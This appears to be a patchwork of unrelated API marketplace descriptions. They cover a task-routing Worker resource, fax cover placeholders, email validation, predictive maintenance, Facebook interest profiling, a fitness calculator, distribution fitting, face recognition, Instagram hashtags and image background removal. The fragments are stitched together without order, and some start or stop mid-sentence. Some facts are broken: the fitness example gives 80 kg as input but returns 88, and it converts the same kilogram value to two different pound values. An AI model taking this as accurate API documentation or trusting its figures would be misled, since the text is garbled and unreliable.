PUT UPDATE Worker: In order to perform more tasks, perform tasks more precisely and in-time, Workers interact with TaskQueues. Workers always listen to multiple TaskQueues or no Queue at all. When a task is feeded to TaskQueue, based on eligibility, capability and role of a Worker, a task is assigned to Worker to perform it. For example, a Worker can be a person in a call center, a web service endpoint that listens to instructions, or an expert fixing the system failure.

For example, a Worker can be a person in a call center, a web service endpoint that listens to instructions, or an expert fixing the system failure. ### Worker Properties * **sid** - The unique string that we created to identify the Worker resource. * **account_sid** - The SID of the Account that created the Worker resource. * **workspace_sid** - The SID of the Workspace that contains the Worker * **available** - Whether the Worker is available to perform tasks. * **friendly_name** - The string that you assigned to describe the resource. Friendly names are case insensitive, and unique within the Rindap Workspace. * **attributes** - A JSON String for describing the Worker and its features such as skills and information. This value is used for deciding which TaskQueues the Worker can receive Tasks from * **activity** - This Activity determines the Worker's current state in the system, as well as whether the Worker can accept new Task assignments. There are 4 types of Activities a Worker can be set to: * **idle:** the Worker is availabe and is waiting for Task Assignments * **busy:** the Worker is not available. The Worker is set to this Activity when a Reservation for this Worker is accepted. * **offline:** the Worker is not available. * **reserved:** This is a system Activity. At this stage, the Worker is paired with a Task and a reservation is created. <aside class=""notice""> This Activity cannot be used by Users for an update Request, It's only used by the System, at the Reservation stage. </aside> * **date_created** - The date and time in GMT when the resource was created, specified in ISO 8601 format. * **date_status_changed** - The date and time in GMT when the Activity of the Worker was last updated, specified in ISO 8601 format. * **date_updated** - The date and time in GMT when the resource was last updated, specified in ISO 8601 format. * **url** - The absolute URL of the resource * **links** - The URLs of related resources. ### Worker Attributes A worker's attributes are used to simply and accurately represent a working entity on Rindap. These attributes can be skills and information about a person , in the case of a human Worker. Or it can be some identifying data and hard-coded parameters for a digital entity like a web service. When populating this field, you should keep in mind that the value in some of these fields might be used for creating the TaskQueue relations of this Worker, according to the `worker_requirements` field of TaskQueues , which is simply a JsonLogic rule. For example , a worker with attributes such as the one below: { ""name"" : ""john doe"" ""age"": 44 ""department"" : ""support"" ""location"": ""Utah"" } would be receiving Tasks from a TaskQueue with worker_requirements as such: { ""=="":[{""var"":""department""},""support""] } Because the requirement rules for the TaskQueue would be matching the attributes of the Worker. <aside class=""success""> <b>Understanding the ""requirements vs attributes"" model is fundamental. </b></br> </br> With this <b>requirements vs attributes</b> model,you do not need to point out which TaskQueues a Worker needs to receive Tasks from or which Workers are suitable for the Tasks in a TaskQueue. </br> When you create a Worker , the Worker will automatically be receiving Tasks from appropriate TaskQueues. And when attributes of a Worker are updated, the Workers related TaskQueues are updated accordingly. </br> The same goes for TaskQueues : When requirements for a TaskQueue are updated , the related Workers for the TaskQueue are updated. </aside> "

IMPORTANT NOTE: This method allowed only selection of cover template using the cover_id argument up to and including API 3.4MR8. We kept that argument valid in API 3.5 meaning that the UUIDs for the standard covers are the same as their ID. We will remove the template_id argument in future versions of this API and most likely reorder the arguments. So: for now everything is backwards compatible, but we will break that soon, so please update your code to use the UUID pattern. Just do not pass template_id anymore and pass template_uuid instead. Since API 3.5 you may set your own covers using the UserInfoAPI. See AddCover method there for a detailed description of standard placeholders, here's just the list: {ToName} {FaxNumber} {FromName} {Date} {Page} {Pages} {Message} Using the $data $argument you can fill up the cover with user-specific data other than the standard placeholders. You may also use it to overwrite the standard placeholders values with you own data. Your data keys should be build up like this: {my_var} (including the brackets) Sample: ""{MyOwnName}""=>""PamFax Tester"", ""{MyOwnLorem}""=>""Ipsum"" Note that you may send in more data than actually present in the cover template, meaning that if you provide your own set of standard covers with your own placeholders, you may pass the values in here even if the user selected another/an own cover without the placeholders inside.

This API takes an email address within the request and performs a 3-step email list cleaning process to determine if the email address is valid or not. The first step is a very basic clean where any typos, syntax errors, and duplicates are removed. At the same time, the email address is checked for bad MX records, no-reply email addresses, catch-all mailboxes etc. All this is sent back in the response JSON packet. The second step is our advanced social media lookup. In this step we check to see if the email address is valid on any social media networks. We check against the top 12 social networks. This is very effective in terms of determining if a Yahoo email address is valid or not because the traditional method of checking Yahoo email addresses using SMTP does not always work. The third and final step is completing a full SMTP handshake to determine if an email address is valid. The API support multi-threading. For higher volume users, the API also comes with a dedicated trunk with better throttle limits to provide a faster email validation process.

This requires calculating the asset's remaining-useful-life (RUL) based on the current and historic usage patterns and building a mathematical model that is capable of extrapolating failures from the past to the future. The Predictive Maintenance API offers: - failure rate estimation based on real-time operating conditions - failure rate estimation based on historic failure patterns The *Real-time Failure Rate API* allows you to calculate the failure rate of various components, such as Accumulators, Actuators, Belts, Clutches, Brakes etc. in real-time based on the prevailing operating conditions of the assets. This helps you in estimating the RUL for various assets such as: - vehicles in motion, based on the sensors attached to the vehicles to various key parts - stationary machinery in manufacturing plants - individual components inside machines etc. When you do not have the previous failure records or maintenance records available, or if your machinery is brand new with provisions to capture the required data using sensors, this API is the best option for high accuracy predictions. The *Historic Failure Rate API* allows you estimate the asset failure risks for a population of assets based on the maintenance records and previous failure patterns. This helps when you do not have provision to attach sensors and have adequate history of maintenance records for a population of machinery. [Get in touch](http://Cenacle.website/#contact) with us if you are interested in utilizing our Predictive Maintenance API in your applications.

It has two components: sourceContentDigests and categoryTraceableProfiles. GraphDive’s algorithms single out the most important signals from all the noisy signals in a user’s social profile and associated data to generate a ranked set of categorized interests for that user. sourceContentDigests is where you can find the Facebook signals that support a given user interest as ranked by GraphDive’s algorithms. A signal can be an individual user event, such as a “like” on Wimbledon’s Facebook page, or a user activity, such as a check-in at a tennis club. categorizedTraceableProfiles is a sorted list of interest categories (e.g., Sports or Arts) where the categories (each under “categoryName”) are ranked by GraphDive’s algorithms to reflect their relative importance to the user. Each category is then supported by individual user interests or nodes appearing under the traceableInterests list. Each such interest has a “nodeName” and corresponding “nodeId” and references items from the sourceContentDigests list that contributed to that particular node or interest’s score. GET FetchTriggerProfile: FetchTriggerProfile is the basic API call that gives GraphDive access to a user's Facebook Token and ID.

This feature is not available yet and currently returns false. These probability profiles do not necessarily return a user’s declared age, education or marital status; rather, they reflect how old the user acts, feels and behaves as inferred by GraphDive’s algorithrms.

3108,fitness-api,https://rapidapi.com/vibecomputing/api/fitness-api,"Health, Fitness","A fitness calculator API POST fitness: Fitness API Documentation ========================= Introduction ------------ This API provides many formulas to compute many things as your *Body Mass Index (BMI)*, your *Body Fat Percetage (BFP)* or to compute food energy and the list is growing ! Getting started --------------- The first thing is to create an account on [RapidAPI](https://rapidapi.com/marketplace ""RapidAPI marketplace"") to obtain an API key. Then follow the RapidAPI documentation to use the API with your preferred programming language. /fitness route -------------- This route respond only to POST request. The more you add parameters, the more results you will have. For example, if you provide just *height* and *weight* parameters (let's take 190 cm and 80 Kg for this example), you will only have this: ```{.json} { ""height"": 190, ""weight"": 88, ""idealBodyWeight"": { ""peterson"": { ""formulaName"": ""Peterson et al."", ""metric"": { ""value"": 87.8, ""unit"": [ ""Kg"", ""kilograms"" ] }, ""imperial"": { ""value"": 169.9, ""unit"": [ ""lbs"", ""pounds"" ] } } }, ""bodyMassIndex"": { ""value"": 24.4, ""conclusion"": ""Normal"", ""unit"": ""Kg/m²"" } } ``` But, if you provide a gender (*""male""* for example), you will have many more things: ```{.json} { ""height"": 190, ""weight"": 88, ""gender"": ""male"", ""idealBodyWeight"": { ""peterson"": { ""formulaName"": ""Peterson et al."", ""metric"": { ""value"": 87.8, ""unit"": [ ""Kg"", ""kilograms"" ] }, ""imperial"": { ""value"": 193.7, ""unit"": [ ""lbs"", ""pounds"" ] } }, ""lorentz"": { ""formulaName"": ""Lorentz"", ""metric"": { ""value"": 80, ""unit"": [ ""Kg"", ""kilograms"" ] }, ""imperial"": { ""value"": 176.4, ""unit"": [ ""lbs"", ""pounds"" ] } }, ""hamwi"": { ""formulaName"": ""Hamwi"", ""metric"": { ""value"": 88, ""unit"": [ ""Kg"", ""kilograms"" ] }, ""imperial"": { ""value"": 193.9, ""unit"": [ ""lbs"", ""pounds"" ] } }, ""devine"": { ""formulaName"": ""Devine"", ""metric"": { ""value"": 84, ""unit"": [ ""Kg"", ""kilograms"" ] }, ""imperial"": { ""value"": 185.3, ""unit"": [ ""lbs"", ""pounds"" ] } }, ""robinson"": { ""formulaName"": ""Robinson"", ""metric"": { ""value"": 80.1, ""unit"": [ ""Kg"", ""kilograms"" ] }, ""imperial"": { ""value"": 176.6, ""unit"": [ ""lbs"", ""pounds"" ] } }, ""miller"": { ""formulaName"": ""Miller"", ""metric"": { ""value"": 77.1, ""unit"": [ ""Kg"", ""kilograms"" ] }, ""imperial"": { ""value"": 169.9, ""unit"": [ ""lbs"", ""pounds"" ] } } }, ""bodyMassIndex"": { ""value"": 24.4, ""conclusion"": ""Normal"", ""unit"": ""Kg/m²"" } } ``` Simple as that !

For some distribution like normal, uniform, logistic, exponential, there is only one possible value for the skewness and kurtosis whereas for some distributions like gamma, beta, lognormal is defined by larger areas .Kurtosis of normal distribution is mostly considered as 3. We are identifying the best distributions with the help of sum of squared errors. The distribution having least SSE will be considered as the best distribution for that specific column. We are using only those columns that has continuous numeric values and we are not taking into consideration of columns having categorical or discrete values though it is numeric data type. **Parameters to be passed:** - `files` The file on which you want to do data preprocessing.

Information on facial features, including ears, nose, eyebrows, lips, chin are returned as coordinates on the image. The Animetrics Face Recognition API will also detect and return the gender and orientation, or ""pose"" of faces along 3 axes. A special capability called ""SetPose"" is also available which allows the face to be re-rendered at a desired pose that is different than the captured pose. I.e. as if the photo was taken with respect to any desired angle relative to the camera. This is typically used when the facial photo is captured off angle and a zero-corrected fully frontal image (0 degrees pitch, yaw, and roll) is required. Detected facial features may be corrected or modified to improve the final results of subsequent steps. For example, an eye in the picture may be hidden or obscured; requesting just eye feature points, manually correcting their locations, and feeding this data into a more detailed request will help improve the accuracy of additional feature point and pose detection. GET /v2/delete_face: Delete a Face from a known Subject. This operation will only delete the individual Face that is associated with an enrollment transaction for a Subject. The Face ID that is required should be taken from the response of a previous enrollment.

GET Get Related Hashtags Instagram: Get related hashtags directly from Instagram. GET Get Banned Tags: WHAT ARE INSTAGRAM BANNED HASHTAGS? Using relevant hashtags on Instagram can boost your engagement and get your Instagram photos in front of many more people. And it also helps Instagram understand what your content is about so it can show it to the right audience. But not all hashtags are good. Banned hashtags are ones that have been flagged/reported by the Instagram community for a few different reasons. The first obvious reason is that the hashtag is obscene and people are posting things that are against Instagram’s community guidelines. You will see many of these in our banned hashtags list. Another reason is that those hashtags have been used by bots and spammers who like to post to those hashtags repeatedly (that’s called SPAM). So, the reason why you need to avoid using banned hashtags at all, is that Instagram could flag your account as a spammer or as being against their community guidelines. And this, unfortunately, might result in a shadowban of your account. A shadowban on Instagram means they have limited your account (temporarily), effectively bringing your reach and engagement to almost zero. You might be shadowbanned if you see your hashtags are getting zero engagement, for example. GET Get Comprehensive Hashtags: Get a comprehensive list of hashtags based on your keyword "

Our machine learning model is optimized for extracting products and people from photos, cleanly erasing the background. Background removal is a rote and common chore for many people. From creating catchy ecommerce product photos to editing social media profile pictures and many other goals in between, there are countless reasons to isolate foreground objects and remove the background from a photo. Historically, this was a time-consuming and painstaking process that required trained experts using professional software like Photoshop to remove backgrounds from images. Recent advances in artificial intelligence have fortunately changed this. Deep learning algorithms can accurately separate the foreground from background when objects are sufficiently different, as with a Porsche and its dusty garage. Separating a glass of red wine from a white tablecloth, on the other hand, may prove trickier but can be done. Background removal from [Hotpot.ai](https://hotpot.ai) incorporates the latest research in image segmentation and edge detection and is specifically optimized to isolate people and products. There are many situations where designers, entrepreneurs, developers, and consumers might benefit from automatic background removal. Some of these include: - Refining product photos for Shopify, Etsy, or other ecommerce platforms. - Creating more professional photos for Craigslist or eBay listings - Updating social media profile pictures with more appropriate backgrounds - Composing interesting collages from various photos - Adding turnkey marketing materials to print in books, magazines, or brochures - Generating stylish and professional web or Facebook ads "
